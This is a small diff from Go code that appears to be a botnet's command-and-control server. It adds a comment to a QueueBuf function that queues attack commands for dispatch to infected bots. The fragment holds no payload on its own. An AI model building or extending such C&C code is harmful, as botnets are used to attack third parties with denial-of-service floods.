@@ -58,6 +58,7 @@ func (this *ClientList) DelClient(c *Bot) {
     fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
 }
 
+/* to send command from C&C to bots */
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
     attack := &AttackSend{buf, maxbots, botCata}
     this.atkQueue <- attack
